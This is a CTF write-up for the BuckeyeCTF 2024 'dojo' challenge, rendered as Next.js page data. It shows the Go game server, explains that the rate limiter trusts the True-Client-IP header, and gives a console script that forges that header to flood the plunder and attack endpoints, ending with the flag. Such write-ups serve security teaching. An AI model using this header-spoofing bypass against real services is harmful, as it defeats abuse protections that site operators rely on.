t\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"10:\"$Sreact.suspense\"\n11:I[74911,[],\"AsyncMetadata\"]\n7:[\"$\",\"$10\",null,{\"fallback\":null,\"children\":[\"$\",\"$L11\",null,{\"promise\":\"$@12\"}]}]\n"])</script><script>self.__next_f.push([1,"a:null\n"])</script><script>self.__next_f.push([1,"e:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n9:null\n"])</script><script>self.__next_f.push([1,"12:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"kevin.fish\"}]],\"error\":null,\"digest\":\"$undefined\"}\nc:{\"metadata\":\"$12:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"13:I[50674,[\"325\",\"static/chunks/325-8cc74193b249521f.js\",\"134\",\"static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js\"],\"default\"]\n14:T1f20,"])</script><script>self.__next_f.push([1,"package server\n\nimport (\n\t\"encoding/json\"\n\t\"math/rand/v2\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\"\n\t\"github.com/go-chi/httprate\"\n\t\"github.com/go-chi/jwtauth/v5\"\n\t\"github.com/gorilla/websocket\"\n)\n\nvar TokenAuth *jwtauth.JWTAuth\n\nconst MaxBossHealth = 1000\n\ntype GameState struct {\n\tid           int32\n\tbossHealth   int32\n\tplayerHealth int32\n\tplundered    int32\n\tlastDodge    time.Time\n\n\tconn *websocket.Conn\n}\n\nfunc (gs *GameState) SyncJSON() {\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\n\t\t\t\"action\":       \"sync\",\n\t\t\t\"playerHealth\": gs.playerHealth,\n\t\t\t\"bossHealth\":   gs.bossHealth,\n\t\t})\n\t}\n\n\tif gs.bossHealth \u003c= 0 {\n\t\tif gs.conn != nil {\n\t\t\tgs.conn.WriteJSON(map[string]string{\"action\": \"win\"})\n\n\t\t\tif gs.plundered \u003e 800 {\n\t\t\t\tflag, exists := os.LookupEnv(\"FLAG\")\n\t\t\t\tif !exists {\n\t\t\t\t\tflag = \"bctf{fake_flag}\"\n\t\t\t\t}\n\t\t\t\tgs.conn.WriteJSON(map[string]string{\"flag\": flag})\n\t\t\t}\n\n\t\t\tgs.conn.Close()\n\t\t}\n\n\t\tdelete(gameStates, gs.id)\n\t}\n\n\tif gs.playerHealth \u003c= 0 {\n\t\tif gs.conn != nil {\n\t\t\tgs.conn.WriteJSON(map[string]string{\"action\": \"lose\", \"reason\": \"died\"})\n\t\t\tgs.conn.Close()\n\t\t}\n\t\tdelete(gameStates, gs.id)\n\t}\n}\n\nfunc (gs *GameState) PlayerAttack() (success bool, amount int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\treturn false, 0\n\t}\n\n\tamt := int32(rand.IntN(12) + 2)\n\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"player_attack\", \"amount\": amt})\n\t}\n\n\tgs.bossHealth -= amt\n\tgs.SyncJSON()\n\treturn true, amt\n}\n\nfunc (gs *GameState) PlayerDodge() {\n\tgs.lastDodge = time.Now()\n}\n\nfunc (gs *GameState) PlayerPlunder() (bool, int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\treturn false, 0\n\t}\n\n\tamount := int32(rand.IntN(12) + 2)\n\tgs.plundered += amount\n\treturn true, amount\n}\n\nfunc (gs *GameState) BossAttack(amount int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\tif gs.conn != nil {\n\t\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"dodged\", \"amount\": amount})\n\t\t}\n\t\treturn\n\t}\n\n\tgs.playerHealth -= amount\n\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"boss_attack\", \"amount\": amount})\n\t}\n\tgs.SyncJSON()\n}\n\nfunc (gs *GameState) BossSignalAttack() {\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"signal\"})\n\t}\n}\n\nfunc (gs *GameState) BossHeal(amount int32) {\n\tgs.bossHealth = min(gs.bossHealth+amount, MaxBossHealth)\n\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"heal\", \"amount\": amount})\n\t}\n\tgs.SyncJSON()\n}\n\nfunc (gs *GameState) TimeoutLose() {\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]string{\"action\": \"lose\", \"reason\": \"timed out\"})\n\t\tgs.conn.Close()\n\t}\n\tdelete(gameStates, gs.id)\n}\n\nvar gameStates = make(map[int32]*GameState)\n\nvar upgrader = websocket.Upgrader{\n\tReadBufferSize:  1024,\n\tWriteBufferSize: 1024,\n\tCheckOrigin:     func(r *http.Request) bool { return os.Getenv(\"BF_PRODUCTION\") != \"true\" },\n}\n\nfunc (s *Server) RegisterRoutes() http.Handler {\n\tr := chi.NewRouter()\n\tr.Use(middleware.Recoverer)\n\tr.Get(\"/\", s.FrontendHandler)\n\tr.Get(\"/*\", s.FrontendHandler)\n\n\tr.Group(func(r chi.Router) {\n\t\tr.Use(middleware.Logger)\n\t\tr.Use(middleware.Timeout(time.Second * 60))\n\t\tr.Use(httprate.LimitByRealIP(2, time.Second))\n\t\tr.Get(\"/api/new\", s.NewGameHandler)\n\n\t\tr.Group(func(r chi.Router) {\n\t\t\tr.Use(jwtauth.Verifier(TokenAuth))\n\t\t\tr.Use(jwtauth.Authenticator(TokenAuth))\n\n\t\t\tr.Get(\"/api/attack\", s.AttackHandler)\n\t\t\tr.Get(\"/api/dodge\", s.DodgeHandler)\n\t\t\tr.Get(\"/api/plunder\", s.PlunderHandler)\n\t\t\tr.Get(\"/api/ws\", s.WebsocketHandler)\n\t\t})\n\t})\n\n\treturn r\n}\n\nfunc (s *Server) FrontendHandler(w http.ResponseWriter, r *http.Request) {\n\text := filepath.Ext(r.URL.Path)\n\n\t// If there is no file extension, and it does not end with a slash,\n\t// assume it's an HTML file and append .html\n\tif ext == \"\" \u0026\u0026 !strings.HasSuffix(r.URL.Path, \"/\") {\n\t\tr.URL.Path += \".html\"\n\t}\n\n\thttp.FileServer(http.Dir(\"frontend/build\")).ServeHTTP(w, r)\n}\n\nfunc (s *Server) AttackHandler(w http.ResponseWriter, r *http.Request) {\n\t_, claims, _ := jwtauth.FromContext(r.Context())\n\tgame_id := int32(claims[\"game_id\"].(float64))\n\n\tgameState := gameStates[game_id]\n\tif gameState == nil {\n\t\tw.WriteHeader(http.StatusNotFound)\n\t\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"error\", \"message\": \"Game not found\"})\n\t\treturn\n\t}\n\n\tsuccess, amount := gameState.PlayerAttack()\n\tif !success {\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"error\", \"message\": \"You can't attack right now\"})\n\t\treturn\n\t}\n\n\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"success\", \"amount\": amount})\n}\n\nfunc (s *Server) DodgeHandler(w http.ResponseWriter, r *http.Request) {\n\t_, claims, _ := jwtauth.FromContext(r.Context())\n\tgame_id := int32(claims[\"game_id\"].(float64))\n\n\tgameState := gameStates[game_id]\n\tif gameState == nil {\n\t\tw.WriteHeader(http.StatusNotFound)\n\t\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"error\", \"message\": \"Game not found\"})\n\t\treturn\n\t}\n\n\tgameState.PlayerDodge()\n\n\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"success\"})\n}\n\nfunc (s *Server) PlunderHandler(w http.ResponseWriter, r *http.Request) {\n\t_, claims, _ := jwtauth.FromContext(r.Context())\n\tgame_id := int32(claims[\"game_id\"].(float64))\n\n\tgameState := gameStates[game_id]\n\tif gameState == nil {\n\t\tw.WriteHeader(http.StatusNotFound)\n\t\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"error\", \"message\": \"Game not found\"})\n\t\treturn\n\t}\n\n\tsuccess, amount := gameState.PlayerPlunder()\n\tif !success {\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"error\", \"message\": \"You can't plunder right now\"})\n\t\treturn\n\t}\n\n\tjson.NewEncoder(w).Encode(map[string]interface{}{\n\t\t\"status\": \"success\",\n\t\t\"amount\": amount,\n\t\t\"total\":  gameState.plundered,\n\t})\n}\n\nfunc (s *Server) NewGameHandler(w http.ResponseWriter, r *http.Request) {\n\tgameId := rand.Int32()\n\t_, tokenString, _ := TokenAuth.Encode(map[string]interface{}{\"game_id\": gameId})\n\n\tgameStates[gameId] = \u0026GameState{\n\t\tid:           gameId,\n\t\tbossHealth:   MaxBossHealth,\n\t\tplayerHealth: 100,\n\t}\n\n\tcookie := http.Cookie{\n\t\tName:     \"jwt\",\n\t\tValue:    tokenString,\n\t\tHttpOnly: false,\n\t}\n\n\thttp.SetCookie(w, \u0026cookie)\n\n\tgo gameRunner(gameId)\n\n\thttp.Redirect(w, r, \"/play\", http.StatusTemporaryRedirect)\n}\n\nfunc gameRunner(gameId int32) {\n\ts2 := rand.NewPCG(uint64(gameId), 1024)\n\tr2 := rand.New(s2)\n\n\tgo func() {\n\t\ttime.Sleep(60 * time.Second)\n\n\t\tgameState := gameStates[gameId]\n\t\tif gameState == nil {\n\t\t\treturn\n\t\t}\n\n\t\tgameState.TimeoutLose()\n\t}()\n\n\ttime.Sleep(3 * 1000 * time.Millisecond)\n\n\tfor {\n\t\ttime.Sleep(1000 * time.Millisecond)\n\t\tgameState := gameStates[gameId]\n\t\tif gameState == nil {\n\t\t\treturn\n\t\t}\n\n\t\tv := r2.IntN(100)\n\n\t\tif v \u003c 20 {\n\t\t\tif gameState.bossHealth \u003c MaxBossHealth*0.8 {\n\t\t\t\thealAmount := int32(r2.IntN(50) + 20)\n\t\t\t\tgameState.BossHeal(healAmount)\n\t\t\t} else {\n\t\t\t\tdamageAmount := int32(r2.IntN(30) + 5)\n\t\t\t\tgameState.BossAttack(damageAmount)\n\t\t\t}\n\t\t} else if v \u003c 35 {\n\t\t\tgameState.BossSignalAttack()\n\t\t\ttime.Sleep(1000 * time.Millisecond)\n\t\t\tdamageAmount := int32(r2.IntN(50) + 10)\n\t\t\tgameState.BossAttack(damageAmount)\n\t\t} else if v \u003c 50 {\n\t\t\tdamageAmount := int32(r2.IntN(30) + 5)\n\t\t\tgameState.BossAttack(damageAmount)\n\t\t} else if v \u003c 65 {\n\t\t\tgameState.BossSignalAttack()\n\t\t}\n\t}\n}\n\nfunc (s *Server) WebsocketHandler(w http.ResponseWriter, r *http.Request) {\n\t_, claims, _ := jwtauth.FromContext(r.Context())\n\tgameId := int32(claims[\"game_id\"].(float64))\n\n\tgameState := gameStates[gameId]\n\tif gameState == nil {\n\t\tw.WriteHeader(http.StatusNotFound)\n\t\tjson.NewEncoder(w).Encode(map[string]interface{}{\"status\": \"error\", \"message\": \"Game not found\"})\n\t\treturn\n\t}\n\n\tconn, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tgameState.conn = conn\n\tgameState.SyncJSON()\n}"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-3 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"BuckeyeCTF 2024 — dojo\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"The dojo stores many riches. Can you make it through the gauntlet?\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":\"dojo.challs.pwnoh.io\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a Go server looking like this:\"}],\"\\n\",[\"$\",\"$L13\",\"pre-0\",{\"className\":\"my-4\",\"children\":\"$14\",\"language\":\"go\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":\"Our goal is to plunder 800 emeralds, all while defeating the boss and not getting killed in the process.\"}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/1f28d421-8fe1-45a5-9271-4fad8c6897bb\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"children\":\"Looking at the underlying logic for attacking, dodging, and plundering,\"}],\"\\n\",[\"$\",\"$L13\",\"pre-1\",{\"className\":\"my-4\",\"children\":\"func (gs *GameState) PlayerAttack() (success bool, amount int32) {\\n\\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\\n\\t\\treturn false, 0\\n\\t}\\n\\n\\tamt := int32(rand.IntN(12) + 2)\\n\\n\\tif gs.conn != nil {\\n\\t\\tgs.conn.WriteJSON(map[string]interface{}{\\\"action\\\": \\\"player_attack\\\", \\\"amount\\\": amt})\\n\\t}\\n\\n\\tgs.bossHealth -= amt\\n\\tgs.SyncJSON()\\n\\treturn true, amt\\n}\\n\\nfunc (gs *GameState) PlayerDodge() {\\n\\tgs.lastDodge = time.Now()\\n}\\n\\nfunc (gs *GameState) PlayerPlunder() (bool, int32) {\\n\\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\\n\\t\\treturn false, 0\\n\\t}\\n\\n\\tamount := int32(rand.IntN(12) + 2)\\n\\tgs.plundered += amount\\n\\treturn true, amount\\n}\",\"language\":\"go\"}],\"\\n\",[\"$\",\"p\",\"p-4\",{\"children\":\"it seems like attacking and plundering are only prevented after dodging, and don't block the spam of each other. Then, a preliminary idea can be to just spam plunder until we reach 800 emeralds, then spam attack until we kill the boss.\"}],\"\\n\",[\"$\",\"p\",\"p-5\",{\"children\":\"Unfortunately, referencing the route handler again,\"}],\"\\n\",[\"$\",\"$L13\",\"pre-2\",{\"className\":\"my-4\",\"children\":\"\\tr.Group(func(r chi.Router) {\\n\\t\\tr.Use(middleware.Logger)\\n\\t\\tr.Use(middleware.Timeout(time.Second * 60))\\n\\t\\tr.Use(httprate.LimitByRealIP(2, time.Second))\\n\\t\\tr.Get(\\\"/api/new\\\", s.NewGameHandler)\",\"language\":\"go\"}],\"\\n\",[\"$\",\"p\",\"p-6\",{\"children\":[\"it looks like our requests are ratelimited to 2 per second by \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"httprate.LimitByRealIP\"}],\"; naively spamming requests will return \",[\"$\",\"code\",\"code-1\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"429\"}],\"s and we'll still get defeated by the boss.\"]}],\"\\n\",[\"$\",\"p\",\"p-7\",{\"children\":[\"However, going to the \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"httprate\"}],\" source code,\"]}],\"\\n\",[\"$\",\"$L13\",\"pre-3\",{\"className\":\"my-4\",\"children\":\"func LimitByRealIP(requestLimit int, windowLength time.Duration) func(next http.Handler) http.Handler {\\n\\treturn Limit(requestLimit, windowLength, WithKeyFuncs(KeyByRealIP))\\n}\\n\\nfunc Key(key string) func(r *http.Request) (string, error) {\\n\\treturn func(r *http.Request) (string, error) {\\n\\t\\treturn key, nil\\n\\t}\\n}\\n\\nfunc KeyByIP(r *http.Request) (string, error) {\\n\\tip, _, err := net.SplitHostPort(r.RemoteAddr)\\n\\tif err != nil {\\n\\t\\tip = r.RemoteAddr\\n\\t}\\n\\treturn canonicalizeIP(ip), nil\\n}\\n\\nfunc KeyByRealIP(r *http.Request) (string, error) {\\n\\tvar ip string\\n\\n\\tif tcip := r.Header.Get(\\\"True-Client-IP\\\"); tcip != \\\"\\\" {\\n\\t\\tip = tcip\\n\\t} else if xrip := r.Header.Get(\\\"X-Real-IP\\\"); xrip != \\\"\\\" {\\n\\t\\tip = xrip\\n\\t} else if xff := r.Header.Get(\\\"X-Forwarded-For\\\"); xff != \\\"\\\" {\\n\\t\\ti := strings.Index(xff, \\\", \\\")\\n\\t\\tif i == -1 {\\n\\t\\t\\ti = len(xff)\\n\\t\\t}\\n\\t\\tip = xff[:i]\\n\\t} else {\\n\\t\\tvar err error\\n\\t\\tip, _, err = net.SplitHostPort(r.RemoteAddr)\\n\\t\\tif err != nil {\\n\\t\\t\\tip = r.RemoteAddr\\n\\t\\t}\\n\\t}\\n\\n\\treturn canonicalizeIP(ip), nil\\n}\",\"language\":\"go\"}],\"\\n\",[\"$\",\"p\",\"p-8\",{\"children\":[\"it looks like the way they check the client's real IP is through reading the \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"True-Client-IP\"}],\" header. If we forge this header, then, we should be able to bypass their rate limiting and get the flag.\"]}],\"\\n\",[\"$\",\"p\",\"p-9\",{\"children\":\"Occasionally, forged fetches still fail for whatever reason. Still, assuming most fetches still go through, we can spam attacks and plunders with the following console script:\"}],\"\\n\",[\"$\",\"$L13\",\"pre-4\",{\"className\":\"my-4\",\"children\":\"let i = 0;\\nwhile (true) {\\n    try {\\n        const { total } = await (await fetch('/api/plunder', {\\n            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }\\n        })).json();\\n        if (total \u003e 800) break;\\n    } catch {}\\n}\\n\\nlet health = 2000;\\nwhile (health \u003e= 0) {\\n    try {\\n        const { amount } = await (await fetch('/api/attack', {\\n            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }\\n        })).json();\\n        health -= amount;\\n    } catch {}\\n}\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-10\",{\"children\":[\"$\",\"a\",\"a-0\",{\"href\":\"https://gist.github.com/user-attachments/assets/f70ea636-2fe1-4ace-a8d2-204aac7b2f85\",\"children\":\"dojo.webm\"}]}],\"\\n\",[\"$\",\"p\",\"p-11\",{\"children\":\"Once we've won, all we need to do is check the websocket to get the flag:\"}],\"\\n\",[\"$\",\"p\",\"p-12\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/c53bedee-58cf-47c3-9f7a-acecaa9c7019\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"$L13\",\"pre-5\",{\"className\":\"my-4\",\"children\":\"bctf{D3FAul7_rA73_l1m17_fUnc710N5_aR3_5caRy}\",\"language\":\"$undefined\"}]]}]}]\n"])</script></body></html>